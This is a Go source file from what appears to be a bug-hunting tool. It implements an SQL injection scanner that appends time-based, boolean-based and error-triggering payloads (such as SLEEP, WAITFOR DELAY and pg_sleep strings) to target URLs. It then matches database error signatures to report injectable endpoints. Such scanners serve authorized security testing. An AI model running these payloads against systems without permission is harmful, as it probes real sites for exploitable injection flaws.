package scanner

import (
	"bugx/pkg/utils"
	"fmt"
	"math"
	"strings"
	"sync"
	"time"
)

type SQLiScanner struct{}

// SQL error signatures for different databases
// STRICT: Each pattern must be HIGHLY specific to avoid false positives
// General patterns like "Warning" alone are NOT included
var sqlErrorSignatures = map[string][]string{
	"MySQL": {
		// Very specific MySQL error messages
		"You have an error in your SQL syntax",
		"check the manual that corresponds to your (MySQL|MariaDB) server version",
		"MySQL server version for the right syntax",
		"MySqlException \\(0x",                   // Exception with error code
		"com\\.mysql\\.jdbc\\.exceptions",        // Java MySQL exception
		"SQLSTATE\\[42000\\].*MySQL",             // PHP PDO MySQL error
		"#1064 - You have an error",              // phpMyAdmin style
		"supplied argument is not a valid MySQL", // PHP mysql_* error
	},
	"PostgreSQL": {
		// Very specific PostgreSQL error messages
		"ERROR:  syntax error at or near",
		"ERROR:  unterminated quoted string",
		"ERROR:  invalid input syntax for",
		"ERROR:  column .* does not exist",
		"PG::SyntaxError:",      // Ruby pg gem
		"PSQLException: ERROR:", // Java PostgreSQL
		"SQLSTATE\\[42601\\]",   // SQL syntax error code
		"SQLSTATE\\[42P01\\]",   // Undefined table
	},
	"MSSQL": {
		// Very specific MSSQL error messages
		"Unclosed quotation mark after the character string",
		"Incorrect syntax near",
		"ODBC SQL Server Driver.*SQL Server",
		"Microsoft OLE DB Provider for SQL Server",
		"\\[Microsoft\\]\\[ODBC SQL Server Driver\\]",
		"SqlException \\(0x",               // .NET exception with code
		"Msg \\d+, Level \\d+, State \\d+", // SQL Server error format
		"SQLSTATE\\[42000\\].*SQL Server",
	},
	"Oracle": {
		// Very specific Oracle error codes and messages
		"ORA-00933: SQL command not properly ended",
		"ORA-00942: table or view does not exist",
		"ORA-01756: quoted string not properly terminated",
		"ORA-01722: invalid number",
		"ORA-00904: invalid identifier",
		"ORA-\\d{5}:", // Any ORA error with colon
		"oracle\\.jdbc\\.driver\\.OracleDriver",
		"PLS-\\d{5}:", // PL/SQL error codes
	},
	"SQLite": {
		// Very specific SQLite error messages
		"SQLITE_ERROR: near",
		"unrecognized token:",
		"SQLite3::SQLException:",      // Ruby SQLite
		"sqlite3\\.OperationalError:", // Python SQLite
		"\\[SQLITE_ERROR\\] SQL error or missing database",
		"SQLSTATE\\[HY000\\].*SQLite",
		"no such column:",
		"no such table:",
	},
}

// Time-based payloads with expected delays
var timeBasedPayloads = []struct {
	Payload       string
	ExpectedDelay float64
	DBType        string
}{
	{"' AND SLEEP(5)--", 5.0, "MySQL"},
	{"' AND SLEEP(5)#", 5.0, "MySQL"},
	{"1' AND SLEEP(5)--", 5.0, "MySQL"},
	{"'; WAITFOR DELAY '0:0:5'--", 5.0, "MSSQL"},
	{"1'; WAITFOR DELAY '0:0:5'--", 5.0, "MSSQL"},
	{"'; SELECT pg_sleep(5)--", 5.0, "PostgreSQL"},
	{"1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5.0, "MySQL"},
	{"' OR SLEEP(5)--", 5.0, "MySQL"},
	{") OR SLEEP(5)--", 5.0, "MySQL"},
}

// Boolean-based payloads
var booleanPayloads = []struct {
	TruePayload  string
	FalsePayload string
}{
	{"' AND '1'='1", "' AND '1'='2"},
	{"' AND 1=1--", "' AND 1=2--"},
	{"1 AND 1=1", "1 AND 1=2"},
	{" AND 1=1", " AND 1=2"},
	{"' OR '1'='1", "' OR '1'='2"},
}

func (s *SQLiScanner) Scan(config ScanConfig) []ScanResult {
	var processor ResultProcessor
	var wg sync.WaitGroup
	sem := make(chan struct{}, config.Threads)

	fmt.Println(utils.Yellow("\n[i] Starting SQLi Scan..."))
	fmt.Println(utils.White("[*] Methods: Error-based, Time-based (5s delay), Boolean-based"))
	fmt.Println(utils.White("[*] Only CONFIRMED vulnerabilities will be reported\n"))

	for _, url := range config.URLs {
		wg.Add(1)
		sem <- struct{}{}
		go func(url string) {
			defer wg.Done()
			defer func() { <-sem }()

			// Get baseline response
			baseline, err := utils.MakeRequest(url, config.Cookie, config.Timeout)
			if err != nil {
				return
			}

			// 1. Error-based detection
			for _, payload := range config.Payloads {
				targetURL := url + payload
				resp, err := utils.MakeRequest(targetURL, config.Cookie, config.Timeout)
				if err != nil {
					continue
				}

				for dbType, patterns := range sqlErrorSignatures {
					for _, pattern := range patterns {
						if utils.RegexMatch(pattern, resp.Body) {
							// Verify it's not in baseline
							if !utils.RegexMatch(pattern, baseline.Body) {
								fmt.Printf("%s %s\n",
									utils.Red("[✓] SQLi CONFIRMED (Error-based):"),
									utils.Cyan(targetURL))
								fmt.Printf("    → Database: %s, Pattern matched: %s\n",
									utils.Yellow(dbType),
									utils.White(truncateURL(pattern, 50)))

								processor.Add(ScanResult{
									URL:        targetURL,
									Vulnerable: true,
									Payload:    payload,
									Details:    fmt.Sprintf("Error-based SQLi - %s detected", dbType),
								})
								goto nextPayload
							}
						}
					}
				}
			nextPayload:
			}

			// 2. Time-based detection (most reliable)
			fmt.Printf("%s %s\n", utils.White("[*] Testing time-based on:"), utils.Cyan(truncateURL(url, 60)))

			// First, measure baseline response time (5 samples for better accuracy)
			var baselineTimes []float64
			for i := 0; i < 5; i++ {
				start := time.Now()
				_, err := utils.MakeRequest(url, config.Cookie, config.Timeout)
				if err == nil {
					baselineTimes = append(baselineTimes, time.Since(start).Seconds())
				}
			}

			// Declare variables before goto to avoid "jumps over variable declaration" error
			var avgBaseline, maxBaseline float64

			if len(baselineTimes) < 3 {
				goto skipTimeBased // Connection too unstable
			}

			// Calculate average and max baseline
			for _, t := range baselineTimes {
				avgBaseline += t
				if t > maxBaseline {
					maxBaseline = t
				}
			}
			avgBaseline /= float64(len(baselineTimes))

			// If baseline variance is too high, skip time-based (unreliable)
			if maxBaseline-avgBaseline > 2.0 {
				fmt.Printf("%s Network too unstable for time-based on: %s\n",
					utils.Yellow("[!]"), utils.Cyan(truncateURL(url, 50)))
				goto skipTimeBased
			}

			for _, tbPayload := range timeBasedPayloads {
				targetURL := url + tbPayload.Payload

				// SQLMap-style Verification:
				// 1. We start with a baseline check (already done).
				// 2. We perform multiple checks (increased to 4) to ensure consistency.
				// 3. We require a high success rate (3/4) to confirm.

				successCount := 0
				delayTimes := []float64{}
				attempts := 4 // Increased from 3 to 4 for better statistical significance

				for attempt := 0; attempt < attempts; attempt++ {
					// Add small random sleep between requests to avoid synchronization artifacts
					time.Sleep(time.Duration(50+attempt*50) * time.Millisecond)

					start := time.Now()
					_, err := utils.MakeRequest(targetURL, config.Cookie, config.Timeout+10)
					elapsed := time.Since(start).Seconds()

					if err != nil {
						continue
					}

					// Strict Time Comparison:
					// The elapsed time must be close to the expected delay.
					// It must ALSO be significantly higher than the MAXIMUM baseline we ever saw.

					// 1. Check vs Expected
					// Allow 1.0s variance (e.g. 5s delay -> must be > 4.0s)
					expectedMin := tbPayload.ExpectedDelay - 1.0

					// 2. Check vs Baseline
					// Must be at least 3 seconds slower than the slowest normal request
					// This filters out sites that are just naturally slow/jittery
					significantlySlower := elapsed > (maxBaseline + 3.0)

					if elapsed >= expectedMin && significantlySlower {
						successCount++
						delayTimes = append(delayTimes, elapsed)
					}
				}

				// Require 3 out of 4 successful delay detections
				// This drastically reduces false positives from random network spikes
				if successCount >= 3 {
					avgDelay := 0.0
					for _, d := range delayTimes {
						avgDelay += d
					}
					avgDelay /= float64(len(delayTimes))

					fmt.Printf("%s %s\n",
						utils.Red("[✓] SQLi CONFIRMED (Time-based):"),
						utils.Cyan(targetURL))
					fmt.Printf("    → Database: %s, Avg Delay: %.2fs (baseline max: %.2fs), Confirmations: %d/%d\n",
						utils.Yellow(tbPayload.DBType),
						avgDelay,
						maxBaseline,
						successCount,
						attempts)

					processor.Add(ScanResult{
						URL:          targetURL,
						Vulnerable:   true,
						Payload:      tbPayload.Payload,
						ResponseTime: avgDelay,
						Details:      fmt.Sprintf("Time-based SQLi - %s (%.2fs delay, %d/%d confirmed)", tbPayload.DBType, avgDelay, successCount, attempts),
					})
					break // Found time-based, no need to test more
				}
			}

		skipTimeBased:

			// 3. Boolean-based detection (requires double verification)
			for _, bp := range booleanPayloads {
				trueURL := url + bp.TruePayload
				falseURL := url + bp.FalsePayload

				trueResp, err1 := utils.MakeRequest(trueURL, config.Cookie, config.Timeout)
				falseResp, err2 := utils.MakeRequest(falseURL, config.Cookie, config.Timeout)

				if err1 != nil || err2 != nil {
					continue
				}

				// Status code check: both should be 200 (or same code)
				if trueResp.StatusCode != falseResp.StatusCode {
					// Different status codes might indicate injection but also can be error handling
					// Skip unless both are 200
					if trueResp.StatusCode != 200 || falseResp.StatusCode != 200 {
						continue
					}
				}

				// Calculate response difference using multiple methods (SQLMap-style)
				lenDiff := math.Abs(float64(len(trueResp.Body) - len(falseResp.Body)))
				baseLen := float64(len(baseline.Body))

				// Method 1: Length-based difference (>15% of baseline AND >200 bytes)
				lengthCheckPassed := lenDiff > baseLen*0.15 && lenDiff > 200

				// Method 2: Content similarity (SQLMap-style Jaccard similarity)
				// True response should be similar to baseline, False should be different
				trueSimilarity := utils.ContentSimilarity(trueResp.Body, baseline.Body)
				falseSimilarity := utils.ContentSimilarity(falseResp.Body, baseline.Body)
				similarityDiff := trueSimilarity - falseSimilarity

				// Content check: True should be VERY similar to baseline (>95%), False should be DISTINCT (<70%)
				// We also require a significant gap between the two (> 20%)
				contentCheckPassed := trueSimilarity > 0.95 && falseSimilarity < 0.70 && similarityDiff > 0.20

				// Need BOTH checks to pass for high confidence, or strong length diff
				if (lengthCheckPassed && contentCheckPassed) || (lenDiff > baseLen*0.30 && lenDiff > 500) {
					// Verify true response is similar to baseline
					trueDiff := math.Abs(float64(len(trueResp.Body) - len(baseline.Body)))
					if trueDiff < baseLen*0.1 || trueSimilarity > 0.95 {
						// Double verification: Test again to confirm it's consistent
						trueResp2, err3 := utils.MakeRequest(trueURL, config.Cookie, config.Timeout)
						falseResp2, err4 := utils.MakeRequest(falseURL, config.Cookie, config.Timeout)

						if err3 == nil && err4 == nil {
							lenDiff2 := math.Abs(float64(len(trueResp2.Body) - len(falseResp2.Body)))
							similarity2 := utils.ContentSimilarity(trueResp2.Body, baseline.Body)

							// Second test should show similar pattern
							if (lenDiff2 > baseLen*0.15 && lenDiff2 > 200) || similarity2 > 0.90 {
								fmt.Printf("%s %s\n",
									utils.Red("[✓] SQLi CONFIRMED (Boolean-based):"),
									utils.Cyan(trueURL))
								fmt.Printf("    → True/False diff: %.0f bytes, Similarity: %.1f%% vs %.1f%%\n",
									lenDiff, trueSimilarity*100, falseSimilarity*100)

								processor.Add(ScanResult{
									URL:        trueURL,
									Vulnerable: true,
									Payload:    bp.TruePayload,
									Details:    fmt.Sprintf("Boolean-based SQLi (diff: %.0f bytes, similarity verified)", lenDiff),
								})
								break
							}
						}
					}
				}
			}

		}(url)
	}

	wg.Wait()
	printSQLiSummary(processor.Results)
	return processor.Results
}

func printSQLiSummary(results []ScanResult) {
	errorBased, timeBased, booleanBased := 0, 0, 0
	for _, r := range results {
		if strings.Contains(r.Details, "Error-based") {
			errorBased++
		} else if strings.Contains(r.Details, "Time-based") {
			timeBased++
		} else if strings.Contains(r.Details, "Boolean-based") {
			booleanBased++
		}
	}

	fmt.Println(utils.Yellow("\n--------------------------------------------------"))
	fmt.Println(utils.White("SQLi Scan Summary:"))
	fmt.Printf("  %s Error-based: %d\n", utils.Red("●"), errorBased)
	fmt.Printf("  %s Time-based: %d\n", utils.Red("●"), timeBased)
	fmt.Printf("  %s Boolean-based: %d\n", utils.Red("●"), booleanBased)
	fmt.Printf("  %s Total CONFIRMED: %d\n", utils.Green("★"), len(results))
	fmt.Println(utils.Yellow("--------------------------------------------------"))

	if len(results) > 0 {
		fmt.Println(utils.Green("\n[!] All findings are VERIFIED - exploitation possible!"))
	} else {
		fmt.Println(utils.Yellow("\n[i] No confirmed SQL injection vulnerabilities found."))
	}
}
